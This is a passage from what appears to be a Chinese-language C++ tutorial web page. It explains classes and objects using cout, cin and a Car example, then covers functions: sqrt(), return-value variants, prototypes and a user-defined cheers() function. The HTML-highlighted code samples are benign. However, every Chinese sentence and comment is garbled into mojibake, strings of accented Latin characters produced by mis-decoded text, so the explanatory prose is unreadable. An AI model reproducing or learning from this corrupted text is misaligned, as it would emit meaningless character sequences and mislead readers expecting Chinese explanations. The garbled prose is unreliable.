<code>ostream</code> ç±»ï¼ˆè¾“å‡ºæµç±»ï¼‰çš„ä¸€ä¸ªå¯¹è±¡ã€‚</li><li>  <code>cin</code> æ˜¯ <code>istream</code> ç±»ï¼ˆè¾“å…¥æµç±»ï¼‰çš„ä¸€ä¸ªå¯¹è±¡ã€‚</li></ul><p><code>ostream</code> ç±»å®šä¹‰äº†å¦‚ä½•å¤„ç†è¾“å‡ºï¼ŒåŒ…æ‹¬ <code>&lt;&lt;</code> è¿ç®—ç¬¦å¦‚ä½•é’ˆå¯¹ä¸åŒæ•°æ®ç±»å‹å·¥ä½œã€‚<code>istream</code> ç±»å®šä¹‰äº†å¦‚ä½•å¤„ç†è¾“å…¥ï¼ŒåŒ…æ‹¬ <code>&gt;&gt;</code> è¿ç®—ç¬¦å¦‚ä½•è¯»å–æ•°æ®ã€‚</p><p><strong>æ¦‚å¿µç†è§£:</strong></p><p>æƒ³è±¡ä¸€ä¸‹ â€œæ±½è½¦â€ è¿™ä¸ª<strong>ç±»</strong>ï¼š</p><ul><li>  <strong>æ•°æ®/å±æ€§ (æˆå‘˜å˜é‡):</strong> é¢œè‰²ã€å“ç‰Œã€å‹å·ã€å½“å‰é€Ÿåº¦ã€æ²¹é‡ç­‰ã€‚</li><li>  <strong>æ“ä½œ/è¡Œä¸º (æˆå‘˜å‡½æ•°):</strong> å¯åŠ¨()ã€åŠ é€Ÿ()ã€åˆ¹è½¦()ã€é¸£ç¬›()ã€è·å–å½“å‰é€Ÿåº¦() ç­‰ã€‚</li></ul><p>æ ¹æ®è¿™ä¸ª â€œæ±½è½¦â€ ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå…·ä½“çš„<strong>å¯¹è±¡</strong>ï¼Œæ¯”å¦‚ â€œæˆ‘çš„è“è‰²ä¸°ç”°å¡ç½—æ‹‰â€ æˆ– â€œé‚»å±…çš„çº¢è‰²æ³•æ‹‰åˆ©â€ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„å±æ€§å€¼ï¼ˆä¸åŒçš„é¢œè‰²ã€å“ç‰Œç­‰ï¼‰ï¼Œä½†å®ƒä»¬éƒ½å…±äº«ç±»å®šä¹‰çš„è¡Œä¸ºï¼ˆéƒ½å¯ä»¥å¯åŠ¨ã€åŠ é€Ÿã€åˆ¹è½¦ï¼‰ã€‚</p><p><strong>ç¤ºä¾‹ (æ¦‚å¿µæ€§ï¼Œéå®Œæ•´ä»£ç ):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€åŒ–çš„æ¦‚å¿µå±•ç¤ºï¼Œä¸æ˜¯å®Œæ•´çš„ C++ ç±»å®šä¹‰</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// å…¬æœ‰æ¥å£ï¼Œå¤–éƒ¨å¯ä»¥è®¿é—®</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startEngine</span><span class="params">()</span></span>; <span class="comment">// æˆå‘˜å‡½æ•°å£°æ˜</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accelerate</span><span class="params">(<span class="keyword">int</span> amount)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">displayInfo</span><span class="params">()</span></span>; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// ç§æœ‰æ•°æ®ï¼Œå¤–éƒ¨ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œåªèƒ½é€šè¿‡æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> color;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> brand;</span><br><span class="line">    <span class="keyword">int</span> currentSpeed;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... åœ¨ç¨‹åºçš„å…¶ä»–åœ°æ–¹ ...</span></span><br><span class="line"><span class="comment">// Car myCar; // åˆ›å»ºä¸€ä¸ª Car ç±»çš„å¯¹è±¡ (éœ€è¦æ„é€ å‡½æ•°ç­‰ï¼Œæ­¤å¤„çœç•¥)</span></span><br><span class="line"><span class="comment">// myCar.startEngine(); // è°ƒç”¨å¯¹è±¡çš„æˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="comment">// myCar.accelerate(50);</span></span><br><span class="line"><span class="comment">// myCar.displayInfo(); </span></span><br></pre></td></tr></table></figure><p>åœ¨åç»­ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥å­¦ä¹ å¦‚ä½•å®šä¹‰å’Œä½¿ç”¨è‡ªå·±çš„ç±»ã€‚ç›®å‰ï¼Œåªéœ€ç†è§£ç±»æ˜¯å®šä¹‰æ•°æ®å’Œç›¸å…³æ“ä½œçš„ä¸€ç§æ–¹å¼ï¼Œè€Œå¯¹è±¡æ˜¯ç±»çš„å…·ä½“å®ä¾‹ï¼Œ<code>cout</code> å’Œ <code>cin</code> å°±æ˜¯æˆ‘ä»¬å·²ç»æ¥è§¦åˆ°çš„å¯¹è±¡å®ä¾‹ã€‚</p><h2 id="2-4-å‡½æ•°"><a href="#2-4-å‡½æ•°" class="headerlink" title="2.4 å‡½æ•°"></a>2.4 å‡½æ•°</h2><p>å‡½æ•°æ˜¯C++ç¨‹åºçš„æ„å»ºå—ï¼Œå®ƒä»¬æ˜¯æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„å‘½åä»£ç æ®µã€‚ä½¿ç”¨å‡½æ•°å¯ä»¥ä½¿ç¨‹åºæ¨¡å—åŒ–ã€æ›´æ˜“äºç†è§£å’Œç»´æŠ¤ã€‚æœ¬èŠ‚å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨å’Œå®šä¹‰å‡½æ•°ã€‚</p><h3 id="2-4-1-ä½¿ç”¨æœ‰è¿”å›å€¼çš„å‡½æ•°"><a href="#2-4-1-ä½¿ç”¨æœ‰è¿”å›å€¼çš„å‡½æ•°" class="headerlink" title="2.4.1 ä½¿ç”¨æœ‰è¿”å›å€¼çš„å‡½æ•°"></a>2.4.1 ä½¿ç”¨æœ‰è¿”å›å€¼çš„å‡½æ•°</h3><p>è®¸å¤šC++å‡½æ•°ä¼šæ‰§è¡Œä¸€ä¸ªæ“ä½œå¹¶è¿”å›ä¸€ä¸ªå€¼ç»™è°ƒç”¨å®ƒçš„ä»£ç ã€‚è¿™ç§å‡½æ•°è¢«ç§°ä¸º**æœ‰è¿”å›å€¼çš„å‡½æ•° (Function with Return Value)**ã€‚</p><p>æˆ‘ä»¬å·²ç»ä½¿ç”¨è¿‡ä¸€äº›æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œä¾‹å¦‚ C++ æ ‡å‡†åº“ <code>&lt;cmath&gt;</code> (æˆ– C è¯­è¨€çš„ <code>&lt;math.h&gt;</code>) ä¸­æä¾›çš„ <code>sqrt()</code> å‡½æ•°ï¼Œå®ƒè®¡ç®—ä¸€ä¸ªæ•°çš„å¹³æ–¹æ ¹å¹¶è¿”å›ç»“æœã€‚</p><p><strong>ä½¿ç”¨æ–¹æ³•:</strong></p><ol><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> ç¡®ä¿åŒ…å«äº†æä¾›è¯¥å‡½æ•°å£°æ˜çš„å¤´æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>&lt;cmath&gt;</code>ï¼‰ã€‚</li><li> <strong>å‡½æ•°è°ƒç”¨:</strong> ä½¿ç”¨å‡½æ•°åï¼Œå¹¶åœ¨æ‹¬å· <code>()</code> å†…æä¾›æ‰€éœ€çš„**å‚æ•° (Argument)**ï¼ˆä¼ é€’ç»™å‡½æ•°çš„å€¼ï¼‰ã€‚</li><li> <strong>å¤„ç†è¿”å›å€¼:</strong> å‡½æ•°è°ƒç”¨æœ¬èº«å°±æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå…¶å€¼å°±æ˜¯å‡½æ•°çš„è¿”å›å€¼ã€‚å¯ä»¥å°†è¿™ä¸ªè¿”å›å€¼èµ‹ç»™å˜é‡ã€ç”¨åœ¨æ›´å¤æ‚çš„è¡¨è¾¾å¼ä¸­æˆ–ç›´æ¥è¾“å‡ºã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // åŒ…å« cmath å¤´æ–‡ä»¶ä»¥ä½¿ç”¨ sqrt() å‡½æ•°</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> area;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the floor area, in square feet, of your home: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; area; <span class="comment">// è¯»å–ç”¨æˆ·è¾“å…¥çš„é¢ç§¯</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ sqrt() å‡½æ•°ï¼Œå¹¶å°†å‚æ•° area ä¼ é€’ç»™å®ƒ</span></span><br><span class="line">    <span class="comment">// å‡½æ•°çš„è¿”å›å€¼ (area çš„å¹³æ–¹æ ¹) è¢«èµ‹ç»™å˜é‡ side</span></span><br><span class="line">    <span class="keyword">double</span> side = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(area); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;That&#x27;s the equivalent of a square &quot;</span> &lt;&lt; side </span><br><span class="line">              &lt;&lt; <span class="string">&quot; feet to the side.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥åœ¨è¾“å‡ºè¯­å¥ä¸­ä½¿ç”¨è¿”å›å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of 16 is: &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">16</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›å€¼å¯ä»¥ç”¨åœ¨è¡¨è¾¾å¼ä¸­</span></span><br><span class="line">    <span class="keyword">double</span> hypotenuse = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(<span class="number">3.0</span> * <span class="number">3.0</span> + <span class="number">4.0</span> * <span class="number">4.0</span>); <span class="comment">// è®¡ç®—ç›´è§’ä¸‰è§’å½¢æ–œè¾¹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hypotenuse of a 3-4 triangle: &quot;</span> &lt;&lt; hypotenuse &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::sqrt(area)</code>: è¿™æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚<code>std::sqrt</code> æ˜¯å‡½æ•°åï¼Œ<code>area</code> æ˜¯ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚</li><li>  <code>double side = ...</code>: <code>sqrt()</code> å‡½æ•°è¿”å›ä¸€ä¸ª <code>double</code> ç±»å‹çš„å€¼ï¼Œè¿™ä¸ªå€¼è¢«ç”¨æ¥åˆå§‹åŒ– <code>side</code> å˜é‡ã€‚</li></ul><h3 id="2-4-2-å‡½æ•°å˜ä½“"><a href="#2-4-2-å‡½æ•°å˜ä½“" class="headerlink" title="2.4.2 å‡½æ•°å˜ä½“"></a>2.4.2 å‡½æ•°å˜ä½“</h3><p>å‡½æ•°å¯ä»¥æœ‰å¤šç§å½¢å¼ï¼š</p><ol><li> <strong>æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼:</strong> å¦‚ <code>sqrt(double x)</code>ï¼Œæ¥æ”¶ä¸€ä¸ª <code>double</code> å‚æ•°ï¼Œè¿”å›ä¸€ä¸ª <code>double</code> å€¼ã€‚</li><li> <strong>æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼:</strong> ä¾‹å¦‚ï¼ŒæŸäº›åº“å‡½æ•°å¯èƒ½è¯»å–ç³»ç»Ÿæ—¶é—´å¹¶è¿”å›ä¸€ä¸ªå€¼ï¼Œä¸éœ€è¦ç”¨æˆ·æä¾›å‚æ•°ã€‚</li><li> <strong>æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼:</strong> è¿™ç§å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ“ä½œï¼ˆå¦‚æ‰“å°åˆ°å±å¹•ï¼‰ï¼Œä½†ä¸éœ€è¦è¿”å›ä»»ä½•è®¡ç®—ç»“æœã€‚è¿™ç§å‡½æ•°çš„è¿”å›ç±»å‹é€šå¸¸å£°æ˜ä¸º <code>void</code>ã€‚æˆ‘ä»¬å°†åœ¨ 2.4.3 èŠ‚çœ‹åˆ°ä¾‹å­ã€‚</li><li> <strong>æ— å‚æ•°ï¼Œæ— è¿”å›å€¼:</strong> æ‰§è¡Œä¸€ä¸ªå›ºå®šçš„æ“ä½œï¼Œä¸æ¥å—è¾“å…¥å‚æ•°ä¹Ÿä¸è¿”å›ç»“æœï¼Œè¿”å›ç±»å‹ä¹Ÿæ˜¯ <code>void</code>ã€‚</li></ol><p><strong>ç¤ºä¾‹ (æ¦‚å¿µæ€§):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // ä¸ºäº† rand() å’Œ srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // ä¸ºäº† time()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤ºä¾‹ 1: æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼ (æˆ‘ä»¬å°†åœ¨ 2.4.4 å®šä¹‰è‡ªå·±çš„)</span></span><br><span class="line"><span class="comment">// double calculate_something(int input); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤ºä¾‹ 2: æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRandomNumber</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ C æ ‡å‡†åº“å‡½æ•°ç”Ÿæˆä¸€ä¸ªä¼ªéšæœºæ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::rand() % <span class="number">100</span>; <span class="comment">// è¿”å› 0-99 ä¹‹é—´çš„éšæœºæ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤ºä¾‹ 3: æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼ (æˆ‘ä»¬å°†åœ¨ 2.4.3 å®šä¹‰è‡ªå·±çš„)</span></span><br><span class="line"><span class="comment">// void printMessage(std::string msg); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¤ºä¾‹ 4: æ— å‚æ•°ï¼Œæ— è¿”å›å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showStartupMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program starting...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ (é€šå¸¸åªéœ€ä¸€æ¬¡)</span></span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>)); </span><br><span class="line"></span><br><span class="line">    showStartupMessage(); <span class="comment">// è°ƒç”¨æ— å‚æ•°ã€æ— è¿”å›å€¼çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> randomNumber = getRandomNumber(); <span class="comment">// è°ƒç”¨æ— å‚æ•°ã€æœ‰è¿”å›å€¼çš„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Random number: &quot;</span> &lt;&lt; randomNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å…¶ä»–ç±»å‹çš„å‡½æ•° (å‡è®¾å·²å®šä¹‰)</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Processing data...&quot;);</span></span><br><span class="line">    <span class="comment">// double result = calculate_something(10);</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-3-ç”¨æˆ·å®šä¹‰çš„å‡½æ•°"><a href="#2-4-3-ç”¨æˆ·å®šä¹‰çš„å‡½æ•°" class="headerlink" title="2.4.3 ç”¨æˆ·å®šä¹‰çš„å‡½æ•°"></a>2.4.3 ç”¨æˆ·å®šä¹‰çš„å‡½æ•°</h3><p>é™¤äº†ä½¿ç”¨åº“å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å®šä¹‰è‡ªå·±çš„å‡½æ•°æ¥æ‰§è¡Œç‰¹å®šä»»åŠ¡ã€‚è¿™æœ‰åŠ©äºç»„ç»‡ä»£ç å’Œé‡ç”¨ä»£ç ã€‚</p><p><strong>å®šä¹‰å‡½æ•°çš„åŸºæœ¬ç»“æ„:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterList)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“: åŒ…å«æ‰§è¡Œä»»åŠ¡çš„è¯­å¥</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// å¦‚æœ returnType ä¸æ˜¯ voidï¼Œåˆ™éœ€è¦ return è¯­å¥è¿”å›ä¸€ä¸ªå€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>returnType</code>: å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¿”å›çš„æ•°æ®ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸è¿”å›å€¼ï¼Œåˆ™ä½¿ç”¨ <code>void</code>ã€‚</li><li>  <code>functionName</code>: ä½ ä¸ºå‡½æ•°é€‰æ‹©çš„åç§°ã€‚</li><li>  <code>parameterList</code>: å‡½æ•°æ¥å—çš„å‚æ•°åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ¯ä¸ªå‚æ•°çš„ç±»å‹å’Œåç§°ã€‚å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œæ‹¬å· <code>()</code> ä»ç„¶éœ€è¦ï¼Œä½†å†…éƒ¨ä¸ºç©ºã€‚</li><li>  <code>&#123; ... &#125;</code>: å‡½æ•°ä½“ï¼ŒåŒ…å«å‡½æ•°çš„ä»£ç ã€‚</li></ul><p><strong>å‡½æ•°åŸå‹ (Function Prototype):</strong></p><p>åœ¨ä½¿ç”¨å‡½æ•°ä¹‹å‰ï¼Œç¼–è¯‘å™¨éœ€è¦çŸ¥é“å‡½æ•°çš„æ¥å£ï¼ˆè¿”å›ç±»å‹ã€åç§°ã€å‚æ•°åˆ—è¡¨ï¼‰ã€‚é€šå¸¸å°†<strong>å‡½æ•°åŸå‹</strong>æ”¾åœ¨ <code>main()</code> å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚åŸå‹çœ‹èµ·æ¥åƒå‡½æ•°å¤´ï¼Œä½†ä»¥åˆ†å· <code>;</code> ç»“å°¾ï¼Œå¯ä»¥çœç•¥å‚æ•°åã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">returnType <span class="title">functionName</span><span class="params">(parameterTypeList)</span></span>; <span class="comment">// å‡½æ•°åŸå‹</span></span><br></pre></td></tr></table></figure><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (å®šä¹‰ä¸€ä¸ªæ— è¿”å›å€¼çš„å‡½æ•°):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ (å£°æ˜)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span></span>; <span class="comment">// å£°æ˜ cheers å‡½æ•°æ¥å—ä¸€ä¸ª int å‚æ•°ï¼Œæ— è¿”å›å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter an integer: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; count;</span><br><span class="line">    </span><br><span class="line">    cheers(count); <span class="comment">// å‡½æ•°è°ƒç”¨ï¼šå°† count çš„å€¼ä¼ é€’ç»™ cheers å‡½æ•°</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Done!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cheers</span><span class="params">(<span class="keyword">int</span> n)</span> <span class="comment">// å®šä¹‰ cheers å‡½æ•°ï¼Œå‚æ•°åä¸º n</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å‡½æ•°ä½“</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cheers! &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// å› ä¸ºè¿”å›ç±»å‹æ˜¯ voidï¼Œæ‰€ä»¥ä¸éœ€è¦ return è¯­å¥è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>åŸå‹:</strong> <code>void cheers(int n);</code> å‘Šè¯‰ç¼–è¯‘å™¨ <code>main</code> å‡½æ•°åé¢ä¼šå®šä¹‰ä¸€ä¸ªåä¸º <code>cheers</code> çš„å‡½æ•°ã€‚</li><li>  <strong>è°ƒç”¨:</strong> <code>cheers(count);</code> æ‰§è¡Œ <code>cheers</code> å‡½æ•°çš„ä»£ç ï¼Œå¹¶å°† <code>count</code> çš„å€¼å¤åˆ¶ç»™ <code>cheers</code> å‡½æ•°çš„å‚æ•° <code>n</code>ï¼ˆè¿™ç§°ä¸º<strong>æŒ‰å€¼ä¼ é€’</strong>ï¼‰ã€‚</li><li>  <strong>å®šä¹‰:</strong> æä¾›äº† <code>cheers</code> å‡½æ•°çš„å…·ä½“å®ç°ã€‚</li></ul><h3 id="2-4-4-ç”¨æˆ·å®šä¹‰çš„æœ‰è¿”å›å€¼çš„å‡½æ•°"><a href="#2-4-4-ç”¨æˆ·å®šä¹‰çš„æœ‰è¿”å›å€¼çš„å‡½æ•°" class="headerlink" title="2.4.4 ç”¨æˆ·å®šä¹‰çš„æœ‰è¿”å›å€¼çš„å‡½æ•°"></a>2.4.4 ç”¨æˆ·å®šä¹‰çš„æœ‰è¿”å›å€¼çš„å‡½æ•°</h3><p>æˆ‘ä»¬å¯ä»¥å®šä¹‰è‡ªå·±çš„å‡½æ•°æ¥æ‰§è¡Œè®¡ç®—å¹¶è¿”å›ç»“æœã€‚åªéœ€å°† <code>returnType</code> æŒ‡å®šä¸ºæœŸæœ›çš„è¿”å›ç±»å‹ï¼Œå¹¶åœ¨å‡½æ•°ä½“ä¸­ä½¿ç”¨ <code>return</code> è¯­å¥è¿”å›ä¸€ä¸ªè¯¥ç±»å‹çš„å€¼ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span 